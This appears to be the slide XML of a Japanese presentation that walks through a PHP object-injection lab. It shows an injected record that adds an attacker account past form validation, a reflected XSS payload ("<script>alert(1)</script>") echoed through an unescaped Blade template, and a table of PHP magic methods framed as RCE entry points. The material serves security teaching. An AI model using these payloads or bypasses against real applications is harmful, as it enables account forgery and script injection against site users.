            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1395"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="900" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="ECEAE4"/>
                </a:solidFill>
                <a:latin typeface="JetBrains Mono" pitchFamily="49" charset="0"/>
                <a:ea typeface="JetBrains Mono" pitchFamily="49" charset="-122"/>
                <a:cs typeface="JetBrains Mono" pitchFamily="49" charset="-120"/>
              </a:rPr>
              <a:t>  'attacker@htbank.com',</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1395"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="900" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="ECEAE4"/>
                </a:solidFill>
                <a:latin typeface="JetBrains Mono" pitchFamily="49" charset="0"/>
                <a:ea typeface="JetBrains Mono" pitchFamily="49" charset="-122"/>
                <a:cs typeface="JetBrains Mono" pitchFamily="49" charset="-120"/>
              </a:rPr>
              <a:t>  '$2y$10$...', 'default.jpg'</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1395"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="900" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="ECEAE4"/>
                </a:solidFill>
                <a:latin typeface="JetBrains Mono" pitchFamily="49" charset="0"/>
                <a:ea typeface="JetBrains Mono" pitchFamily="49" charset="-122"/>
                <a:cs typeface="JetBrains Mono" pitchFamily="49" charset="-120"/>
              </a:rPr>
              <a:t>)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1022350" y="3707408"/>
            <a:ext cx="4918456" cy="203200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1400"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="6A7179"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>→ アプリ層のバリデーション（登録フォーム）をデシリアライズ経路で迂回</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Shape 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6188075" y="1482725"/>
            <a:ext cx="5187950" cy="4356100"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2259"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFFFF"/>
          </a:solidFill>
          <a:ln w="6350">
            <a:solidFill>
              <a:srgbClr val="E2E0D9"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Text 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6394450" y="1689100"/>
            <a:ext cx="4918456" cy="212030"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1470"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1050" b="1" spc="50" kern="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="E08A3C"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>結果2：反射型XSS</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Text 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6394450" y="1977330"/>
            <a:ext cx="4918456" cy="463550"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1725"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="4A5058"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Blade テンプレートで {!! ... !!} はhtmlspecialchars無しで出力 → Nameフィールドにスクリプトを注入</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Text 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6394450" y="2517080"/>
            <a:ext cx="4775200" cy="734516"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 8645"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="14171A"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="83001" tIns="83001" rIns="0" bIns="57601" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1395"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="900" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="ECEAE4"/>
                </a:solidFill>
                <a:latin typeface="JetBrains Mono" pitchFamily="49" charset="0"/>
                <a:ea typeface="JetBrains Mono" pitchFamily="49" charset="-122"/>
                <a:cs typeface="JetBrains Mono" pitchFamily="49" charset="-120"/>
              </a:rPr>
              <a:t>Name = "&lt;script&gt;alert(1)&lt;/script&gt;"</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1395"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="900" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="ECEAE4"/>
                </a:solidFill>
                <a:latin typeface="JetBrains Mono" pitchFamily="49" charset="0"/>
                <a:ea typeface="JetBrains Mono" pitchFamily="49" charset="-122"/>
                <a:cs typeface="JetBrains Mono" pitchFamily="49" charset="-120"/>
              </a:rPr>
              <a:t>↓ Import後のメッセージに反射</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1395"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="900" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="ECEAE4"/>
                </a:solidFill>
                <a:latin typeface="JetBrains Mono" pitchFamily="49" charset="0"/>
                <a:ea typeface="JetBrains Mono" pitchFamily="49" charset="-122"/>
                <a:cs typeface="JetBrains Mono" pitchFamily="49" charset="-120"/>
              </a:rPr>
              <a:t>{!! Session::get('ie-message') !!}</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Text 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6394450" y="3353197"/>
            <a:ext cx="4918456" cy="203200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1400"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="6A7179"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>→ Object Injection単体でも実害（XSS）が成立した例</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6F2"/>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63550"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="3450"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="3000" b="1" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1A1D21"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>PHPマジックメソッド（RCEの起点）</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Shape 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="812800" y="1428750"/>
            <a:ext cx="10566400" cy="2160290"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3527"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFFFF"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Shape 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="812800" y="1428750"/>
            <a:ext cx="10566400" cy="2160290"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:cxnLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="10566400" h="2160290">
                <a:moveTo>
                  <a:pt x="10490200" y="0"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="10490200" y="0"/>
                </a:lnTo>
                <a:arcTo hR="76200" wR="76200" stAng="16200000" swAng="5400000"/>
                <a:lnTo>
                  <a:pt x="10566400" y="2084090"/>
                </a:lnTo>
                <a:arcTo hR="76200" wR="76200" stAng="0" swAng="5400000"/>
                <a:lnTo>
                  <a:pt x="76200" y="2160290"/>
                </a:lnTo>
                <a:arcTo hR="76200" wR="76200" stAng="5400000" swAng="5400000"/>
                <a:lnTo>
                  <a:pt x="0" y="2084090"/>
                </a:lnTo>
                <a:arcTo hR="69850" wR="76200" stAng="10800000" swAng="-5400000"/>
                <a:lnTo>
                  <a:pt x="10490200" y="2153940"/>
                </a:lnTo>
                <a:arcTo hR="69850" wR="69850" stAng="5400000" swAng="-5400000"/>
                <a:lnTo>
                  <a:pt x="10560050" y="76200"/>
                </a:lnTo>
                <a:arcTo hR="76200" wR="69850" stAng="0" swAng="-5400000"/>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="E2E0D9"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Shape 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="812800" y="1428750"/>
            <a:ext cx="10566400" cy="2160290"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:cxnLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="10566400" h="2160290">
                <a:moveTo>
                  <a:pt x="76200" y="2160290"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="76200" y="2160290"/>
                </a:lnTo>
                <a:arcTo hR="76200" wR="76200" stAng="5400000" swAng="5400000"/>
                <a:lnTo>
                  <a:pt x="0" y="76200"/>
                </a:lnTo>
                <a:arcTo hR="76200" wR="76200" stAng="10800000" swAng="5400000"/>
                <a:lnTo>
                  <a:pt x="10490200" y="0"/>
                </a:lnTo>
                <a:arcTo hR="76200" wR="76200" stAng="16200000" swAng="5400000"/>
                <a:lnTo>
                  <a:pt x="10566400" y="76200"/>
                </a:lnTo>
                <a:arcTo hR="63500" wR="76200" stAng="0" swAng="-5400000"/>
                <a:lnTo>
                  <a:pt x="76200" y="12700"/>
                </a:lnTo>
                <a:arcTo hR="63500" wR="63500" stAng="16200000" swAng="-5400000"/>
                <a:lnTo>
                  <a:pt x="12700" y="2084090"/>
                </a:lnTo>
                <a:arcTo hR="76200" wR="63500" stAng="10800000" swAng="-5400000"/>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="141413">
              <a:alpha val="22000"/>
            </a:srgbClr>
          </a:solidFill>
          <a:ln/>
        </p:spPr>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825500" y="1441450"/>
          <a:ext cx="10547350" cy="2141240"/>
        </p:xfrm>
        <a:graphic>
          <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/table">
            <a:tbl>
              <a:tblPr/>
              <a:tblGrid>
                <a:gridCol w="1898523"/>
                <a:gridCol w="2953258"/>
                <a:gridCol w="5695569"/>
              </a:tblGrid>
              <a:tr h="305891">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr indent="0" marL="0">
                        <a:lnSpc>
                          <a:spcPts val="1540"/>
                        </a:lnSpc>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1100" b="1" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="ECEAE4"/>
                          </a:solidFill>
                          <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                          <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                          <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
                        </a:rPr>
                        <a:t>メソッド</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1100" dirty="0">
                        <a:latin typeface="IBM Plex Sans" charset="0"/>
                        <a:ea typeface="IBM Plex Sans" charset="0"/>
                        <a:cs typeface="IBM Plex Sans" charset="0"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="48895" marR="48895" marT="48895" marB="48895" anchor="t">
                    <a:lnL w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnL>
                    <a:lnR w="12700" cap="flat" cmpd="sng" algn="ctr">
                      <a:solidFill>
                        <a:srgbClr val="141618"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                      <a:round/>
                      <a:headEnd type="none" w="med" len="med"/>
                      <a:tailEnd type="none" w="med" len="med"/>
                    </a:lnR>
                    <a:lnT w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnT>
                    <a:lnB w="12700" cap="flat" cmpd="sng" algn="ctr">
                      <a:solidFill>
                        <a:srgbClr val="141618"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                      <a:round/>
                      <a:headEnd type="none" w="med" len="med"/>
                      <a:tailEnd type="none" w="med" len="med"/>
                    </a:lnB>
                    <a:solidFill>
                      <a:srgbClr val="14171A"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr indent="0" marL="0">
                        <a:lnSpc>
                          <a:spcPts val="1540"/>
                        </a:lnSpc>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1100" b="1" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="ECEAE4"/>
                          </a:solidFill>
                          <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                          <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                          <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
                        </a:rPr>
                        <a:t>呼び出され方</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1100" dirty="0">
                        <a:latin typeface="IBM Plex Sans" charset="0"/>
                        <a:ea typeface="IBM Plex Sans" charset="0"/>
                        <a:cs typeface="IBM Plex Sans" charset="0"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="48895" marR="48895" marT="48895" marB="48895" anchor="t">
                    <a:lnL w="12700" cap="flat" cmpd="sng" algn="ctr">
                      <a:solidFill>
                        <a:srgbClr val="141618"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                      <a:round/>
                      <a:headEnd type="none" w="med" len="med"/>
                      <a:tailEnd type="none" w="med" len="med"/>
                    </a:lnL>
                    <a:lnR w="12700" cap="flat" cmpd="sng" algn="ctr">
                      <a:solidFill>
                        <a:srgbClr val="141618"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                      <a:round/>
                      <a:headEnd type="none" w="med" len="med"/>
                      <a:tailEnd type="none" w="med" len="med"/>
                    </a:lnR>
                    <a:lnT w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnT>
                    <a:lnB w="12700" cap="flat" cmpd="sng" algn="ctr">
                      <a:solidFill>
                        <a:srgbClr val="141618"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                      <a:round/>
                      <a:headEnd type="none" w="med" len="med"/>
                      <a:tailEnd type="none" w="med" len="med"/>
                    </a:lnB>
                    <a:solidFill>
                      <a:srgbClr val="14171A"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr indent="0" marL="0">
                        <a:lnSpc>
                          <a:spcPts val="1540"/>
                        </a:lnSpc>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1100" b="1" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="ECEAE4"/>
                          </a:solidFill>
                          <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                          <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                          <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
                        </a:rPr>
                        <a:t>攻撃での位置づけ</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1100" dirty="0">
                        <a:latin typeface="IBM Plex Sans" charset="0"/>
                        <a:ea typeface="IBM Plex Sans" charset="0"/>
                        <a:cs typeface="IBM Plex Sans" charset="0"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="48895" marR="48895" marT="48895" marB="48895" anchor="t">
                    <a:lnL w="12700" cap="flat" cmpd="sng" algn="ctr">
                      <a:solidFill>
                        <a:srgbClr val="141618"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                      <a:round/>
                      <a:headEnd type="none" w="med" len="med"/>
                      <a:tailEnd type="none" w="med" len="med"/>
                    </a:lnL>
                    <a:lnR w="12700" cap="flat" cmpd="sng" algn="ctr">
                      <a:solidFill>
                        <a:srgbClr val="141618"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                      <a:round/>
                      <a:headEnd type="none" w="med" len="med"/>
                      <a:tailEnd type="none" w="med" len="med"/>
                    </a:lnR>
                    <a:lnT w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnT>
                    <a:lnB w="12700" cap="flat" cmpd="sng" algn="ctr">
                      <a:solidFill>
                        <a:srgbClr val="141618"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                      <a:round/>
                      <a:headEnd type="none" w="med" len="med"/>
                      <a:tailEnd type="none" w="med" len="med"/>
                    </a:lnB>
                    <a:solidFill>
                      <a:srgbClr val="14171A"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="305891">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr indent="0" marL="0">
                        <a:lnSpc>
                          <a:spcPts val="1540"/>
                        </a:lnSpc>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1100" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="3E6FBD"/>
                          </a:solidFill>
                          <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                          <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                          <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
                        </a:rPr>
                        <a:t>__construct</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1100" dirty="0">
                        <a:latin typeface="IBM Plex Sans" charset="0"/>
                        <a:ea typeface="IBM Plex Sans" charset="0"/>
                        <a:cs typeface="IBM Plex Sans" charset="0"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="48895" marR="48895" marT="48895" marB="48895" anchor="t">
                    <a:lnL w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnL>
                    <a:lnR w="12700" cap="flat" cmpd="sng" algn="ctr">
                      <a:solidFill>
                        <a:srgbClr val="CBCBCB"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                      <a:round/>
                      <a:headEnd type="none" w="med" len="med"/>
                      <a:tailEnd type="none" w="med" len="med"/>
                    </a:lnR>
                    <a:lnT w="12700" cap="flat" cmpd="sng" algn="ctr">
                      <a:solidFill>
                        <a:srgbClr val="141618"/>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540"/>
                        </a:lnSpc>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1100" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="1A1D21"/>
                          </a:solidFill>
                          <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                          <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                          <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
                        </a:rPr>
                        <a:t>new Class()</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1100" dirty="0">
                        <a:latin typeface="IBM Plex Sans" charset="0"/>
                        <a:ea typeface="IBM Plex Sans" charset="0"/>
                        <a:cs typeface="IBM Plex Sans" charset="0"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="48895" marR="48895" marT="48895" marB="4889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41618"/>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540"/>
                        </a:lnSpc>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1100" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="1A1D21"/>
                          </a:solidFill>
                          <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                          <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                          <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
                        </a:rPr>
                        <a:t>オブジェクト生成時。攻撃者はシリアライズ経路ではこれを直接は呼べない</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1100" dirty="0">
                        <a:latin typeface="IBM Plex Sans" charset="0"/>
                        <a:ea typeface="IBM Plex Sans" charset="0"/>
                        <a:cs typeface="IBM Plex Sans" charset="0"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="48895" marR="48895" marT="48895" marB="4889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41618"/>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5891">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr indent="0" marL="0">
                        <a:lnSpc>
                          <a:spcPts val="1540"/>
                        </a:lnSpc>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1100" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="3E6FBD"/>
                          </a:solidFill>
                          <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                          <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                          <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
                        </a:rPr>
                        <a:t>__sleep</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1100" dirty="0">
                        <a:latin typeface="IBM Plex Sans" charset="0"/>
                        <a:ea typeface="IBM Plex Sans" charset="0"/>
                        <a:cs typeface="IBM Plex Sans" charset="0"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="48895" marR="48895" marT="48895" marB="48895" anchor="t">
                    <a:lnL w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnL>
                    <a:lnR w="12700" cap="flat" cmpd="sng" algn="ctr">
                      <a:solidFill>
                        <a:srgbClr val="C5C4C1"/>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5C4C1"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                      <a:round/>
                      <a:headEnd type="none" w="med" len="med"/>
                      <a:tailEnd type="none" w="med" len="med"/>
                    </a:lnB>
                    <a:solidFill>
                      <a:srgbClr val="F7F6F2"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr indent="0" marL="0">
                        <a:lnSpc>
                          <a:spcPts val="1540"/>
                        </a:lnSpc>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1100" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="1A1D21"/>
                          </a:solidFill>
                          <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                          <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                          <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
                        </a:rPr>
                        <a:t>serialize($obj)</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1100" dirty="0">
                        <a:latin typeface="IBM Plex Sans" charset="0"/>
                        <a:ea typeface="IBM Plex Sans" charset="0"/>
                        <a:cs typeface="IBM Plex Sans" charset="0"/>
